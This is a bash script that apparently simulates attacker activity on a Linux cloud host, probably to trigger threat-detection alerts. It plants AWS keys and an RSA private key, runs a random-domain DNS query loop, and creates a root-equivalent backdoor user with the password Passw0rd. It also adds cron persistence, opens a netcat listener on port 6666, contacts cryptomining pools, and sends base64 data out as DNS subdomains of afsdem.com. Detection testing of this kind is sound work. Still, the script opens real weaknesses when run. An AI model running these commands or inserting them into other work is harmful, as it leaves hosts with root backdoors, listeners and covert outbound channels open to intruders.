#!/bin/bash

# create fake AWS Keys on the System
mkdir /home/ubuntu/.aws
cat <<- EOF4 > /home/ubuntu/.aws/credentials
[default]
aws_access_key_id = AKIAJYSOCJXDYU3RNQFQ
aws_secret_access_key = WnukQBKjg6dc89221LHnupvvlwh96sIc1WNL7vhv
EOF4
chown ubuntu.ubuntu /home/ubuntu/.aws/credentials
cat <<- EOF5 > /home/ubuntu/ec2-devkey.pem
-----BEGIN RSA PRIVATE KEY-----
MIIFpQIBAAKCAQEAwGmZkKcdaHvRM3q6ldiwuMzNAeeFSutHmpiLt9igK0vfNuKw
JSZVnkeRwVykSJK6B6zNVYxRpBHXCwDs2EkffvIC0lVb6lJ6XywQLE9jwEJItFdg
cnsa62brj+mJL8Lui1AFElNS59gPJ+1YE7lfw6EM2sRABAqm5NMUSTzcqE7VASVc
BeApG2A9zwZrhR+6ezn2H7BElTtpggvdbH6HOCewMIZy5e6xH5FsK4oPOPIa4+H0
h20TS6/lxlB6vbxttlRG/GUAde05c8pmksDNF5JA+MfLXwn7Eam1mnErB8yHUx4A
Jnx0FWujKI+8slDulDk/EM40rz7s58IZiTPqRwIDAQABAoIBAQCDXNUZ2+4I8ld+
RPDz9s+cKz5faXgoEP9+vVzONFgNlywapaNKiaR0fjo1gBEs9veI2+IH4NewIvnk
qkoI08tr+MASZ3JsRMkFBuk3xy+8B8TpUqonHoLcrvht9SvS7su7UvNTco2seWbH
hJPYS3vk7KQBC3EFEVyl5rH32lRvlsssAoJAeRxWZXWcWL5su9V+IKD/cd40QnJj
OASk2VenVymdBFnxY7w6wxCx5dyElazmW2q6X6uHKWVtcZffqQw7mQPJ34/MvKmb
fi/+qFf+IBfuyfj0ZwzrkQa7U0WmHusxEmMraCOWiTpDCcZnPpo7ni96WFntQBOj
g+6hcceRAoGBAOcU5OPkvbtBrVujqw1nFME5Ha9gUmbHOcYunHOQsfC1bp3echQ+
CkMacpMMojjA4sO1XyEABHC8IDGnQHIQUeuHFu0TqmYvJYOCmo2g/Dsq9tyTg4j5
MNz7yJ3ob66wisGZadxLeWluwD4OYTHmkUKU7a/LEXdrb+QALwGyBLRJAoGBANUp
OndBDwovY0bby+gLXb8Koip+d7xSRhk59eHtKJIW9VNcww4ad+8UGQ4ndMfKZdqD
qc0U+aMfWbYnReCzCnGuCiEpyuTQuXNaig0EaxBYY6zcIIG7weRPsLWUdamIgrjH
DfM5L+SawKbV+BZm5/XchF/PGgFHhxkiHr6HzooPAoGBAICfubQ8O3vC1/r9RBYG
vZ+76hEXXWaGGFt+0GjnLpSceMD486jey5mEXCgLzTQn8VEcYKIev1n87TKWNSII
gYDHRfSakKumLIxiIyMYa62HgbdPiNSyWAd5QrbajWfALswKV8leXWtZUTp5iJJd
E5frC85hCwzcyYAwtfmMnF+5AoGBAJK2PLJlyec1tHvJvi9o204pEHJ09w5cBjlI
pk6ov3rFaHbG6s2jNBcOWyxdxcfZK39ZjZ5EqIk4g7OWlkbQlAioQ/qNXENe0bVu
hIPvHY1zeK86FvmT9CCjJLnlg5J7DZYGEzjrjGYoiR6LOKSakV6sN0QGNBzbUUXg
MQ7sRCDLAoGAfoHiNSKh3rzGGXkVUfnUpTffx5rBWMcosQ0k8JMOGJCk+BO3iwHW
QFAvN6RnOcsaH2gXrzCRGh7ZlwHO6JX4Ggjt/UZ9huWn9TOLkgyzvLEn84ci1hig
NDxp6xUB+1ZinCsDX8Jtv9JgxZ42cq8K2ihkXuJrj/X7Pym9zcJEEKs=
-----END RSA PRIVATE KEY-----
EOF5
chown ubuntu.ubuntu /home/ubuntu/ec2-devkey.pem
chmod 400 /home/ubuntu/ec2-devkey.pem

echo "domain callout"

cat <<- "EOF" > dga1.sh
#!/bin/bash
# Create some bogus domain names and perform DNS queries
# Against a host that is not a DNS Server
cp /usr/bin/dig /usr/sbin/evildigger
while [ 1 ]
do
    PART=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 18 | head -n 1)
    /usr/sbin/evildigger @10.0.1.10 www.$PART.com
done
EOF
chmod +x dga1.sh
at -f dga1.sh now &



#Create a backdoor user
useradd -ou 0 -g 0 hacked-user
echo Passw0rd | passwd hacked-user --stdin &>/dev/null

cat <<- EOF2 > /boot/grub/call2mins.sh
#!/bin/bash
# Call Out Every 2 Minutes
(crontab -l ; echo "*/2 * * * *  /bin/hello") | crontab -
EOF2
chmod +x /boot/grub/call2mins.sh
at -f /boot/grub/call2mins.sh now &


echo "A"

cd /tmp
cp /bin/nc /tmp/remotec
echo "/tmp/remotec -k -l 6666" > darkl0rd_user
chmod +x darkl0rd_user
# execute the command at a specific time (now)
at -f darkl0rd_user now &


# Install xmrig and launch minining.

mkdir -p /usr/cryptokit
touch /usr/cryptokit/persist.sh
chmod 750 /usr/cryptokit/persist.sh
echo "#!/bin/bash" >> /usr/cryptokit/persist.sh
echo "dig donate.v2.xmrig.com" >> /usr/cryptokit/persist.sh
echo "dig systemten.org" >> /usr/cryptokit/persist.sh
echo "dig xmr.pool.minergate.comac" >> /usr/cryptokit/persist.sh
echo "dig pool.minergate.com" >> /usr/cryptokit/persist.sh
echo "dig dockerupdate.anondns.net" >> /usr/cryptokit/persist.sh
echo "dig rspca-northamptonshire.org.uk" >> /usr/cryptokit/persist.sh
echo "dig xmrpool.eu" >> /usr/cryptokit/persist.sh
echo "dig cryptofollow.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-usa.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu.dwarfpool.com" >> /usr/cryptokit/persist.sh
echo "dig xmr-eu1.nanopool.org" >> /usr/cryptokit/persist.sh
echo "curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &" >> /usr/cryptokit/persist.sh
echo "for i in {1..10};" >> /usr/cryptokit/persist.sh
echo "do" >> /usr/cryptokit/persist.sh
echo "  dig CgpMb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldC.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig wgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig LiBWZXN0aWJ1bHVtIGFjIHJpc3VzIGRvbG9yLi.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig BJbiBldSBpbXBlcmRpZXQgbWksIGlkIHNjZWxl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cmlzcXVlIG9yY2kuIE51bGxhbSB1dCBsaWJlcm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8gcHVydXMuIFBlbGxlbnRlc3F1ZSBhdCBmcmlu.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Z2lsbGEgbWV0dXMsIGFjIHVsdHJpY2VzIGVyYX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QuIEZ1c2NlIGN1cnN1cyBtb2xsaXMgcmlzdXMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dXQgdWx0cmljaWVzLiBOYW0gbWFzc2EganVzdG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 8sIHVsdHJpY2llcyBhdWN0b3IgbWkgdXQsIGRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3R1bSBsb2JvcnRpcyBudWxsYS4gTnVsbGEgc2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig l0IGFtZXQgZmVsaXMgbm9uIGlwc3VtIHZlc3Rp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YnVsdW0gcmhvbmN1cy4gTG9yZW0gaXBzdW0gZG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFk.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXBpc2NpbmcgZWxpdC4gSW4gZmF1Y2lidXMgaW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig QgZWxpdCBhdCBtYXhpbXVzLiBBbGlxdWFtIGRh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGlidXMgdXQgbWF1cmlzIG5lYyBmYXVjaWJ1cy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gUHJvaW4gYXVjdG9yIGxpYmVybyBuZWMgYXVn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dWUgc2FnaXR0aXMgY29uZGltZW50dW0uIFZlc3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpYnVsdW0gYmliZW5kdW0gb2RpbyBxdWFtLCBh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCBjb25ndWUgbnVsbGEgdml2ZXJyYSBpbi4gSW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 4gdWx0cmljaWVzIHR1cnBpcyBhdCBmYWNpbGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXMgZGljdHVtLiBFdGlhbSBuaXNpIGFudGUsIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig RpY3R1bSBldCBoZW5kcmVyaXQgbmVjLCBzb2Rh.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGVzIGlkIGVyb3MuCgpQaGFzZWxsdXMgZmV1Z2.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig lhdCBudW5jIHNlZCBzdXNjaXBpdCBmYXVjaWJ1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cy4gQWVuZWFuIHRpbmNpZHVudCBwb3J0dGl0b3.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IgbmlzbCwgdXQgY3Vyc3VzIGZlbGlzIHZvbHV0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig cGF0IHZpdGFlLiBNb3JiaSBuZWMgbGVvIHB1bH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZpbmFyLCBhY2N1bXNhbiBtYXVyaXMgbmVjLCBj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig b21tb2RvIG1hdXJpcy4gTmFtIGNvbW1vZG8gZW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dldCBlbmltIGF0IGFsaXF1YW0uIFN1c3BlbmRp.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3NlIGVnZXN0YXMgbWFzc2EgaWQgcmlzdXMgcG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGVudGVzcXVlIHBvcnR0aXRvciBuZWMgbmVj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IG5lcXVlLiBDcmFzIG5lYyBzZW0gYXJjdS4gTn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEgcXVpcyBzYXBpZW4gaW4gbGFjdXMgbGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aW5pYSB1bHRyaWNlcyBtYXR0aXMgZXQgcHVydX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MuIE51bmMgZmVybWVudHVtIG5lcXVlIGlkIG51.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bmMgYmxhbmRpdCBtYXhpbXVzLiBEdWlzIGV1IH.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig NvbGxpY2l0dWRpbiBudWxsYSwgYWMgbWF0dGlz.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlLiBNYXVyaXMgcXVpcyBjdXJzdXMgaX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig BzdW0sIHF1aXMgZnJpbmdpbGxhIHNlbS4gTW9y.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YmkgbWFsZXN1YWRhIHNhcGllbiBzZWQgbWV0dX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgY29udmFsbGlzLCBzaXQgYW1ldCBldWlzbW9k.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlIHBlbGxlbnRlc3F1ZS4gTW9yYmkgbm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig liaCBlcmF0LCBwb3N1ZXJlIHNpdCBhbWV0IGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3Vtc2FuIG5lYywgbWFsZXN1YWRhIGEgbGVvLg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig oKRG9uZWMgZXUgcHJldGl1bSBvZGlvLiBBZW5l.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YW4gdHJpc3RpcXVlIHF1YW0gdmVsIG9yY2kgYW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig xpcXVhbSwgbmVjIHNjZWxlcmlzcXVlIG51bmMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3VzY2lwaXQuIEV0aWFtIGVsaXQgc2VtLCB2aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZlcnJhIG5lYyBmcmluZ2lsbGEgdml0YWUsIGV1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXNtb2QgaWQgdHVycGlzLiBJbnRlZ2VyIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgZXJhdCBlZ2V0IGFyY3UgdGluY2lkdW50IHBl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGxlbnRlc3F1ZS4gQ3VyYWJpdHVyIHF1YW0gbn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEsIGx1Y3R1cyB2ZWwgdm9sdXRwYXQgZWdl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCwgZGFwaWJ1cyBldCBudW5jLiBOdW5jIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgbGliZXJvIGFsaXF1YW0sIGNvbmRpbWVudHVt.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGp1c3RvIHF1aXMsIGxhY2luaWEgbmVxdWUuIF.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Byb2luIGRhcGlidXMgZWxpdCBhdCBoZW5kcmVy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXQgbWF4aW11cy4gU2VkIHNlbXBlciBudW5jIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 1hc3NhLCBlZ2V0IHBlbGxlbnRlc3F1ZSBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IHNhZ2l0dGlzIHNlZC4g.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "done" >> /usr/cryptokit/persist.sh
one_call=$(/usr/cryptokit/persist.sh)
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root
echo "*/15 * * * * /usr/cryptokit/persist.sh" >> /var/spool/cron/root


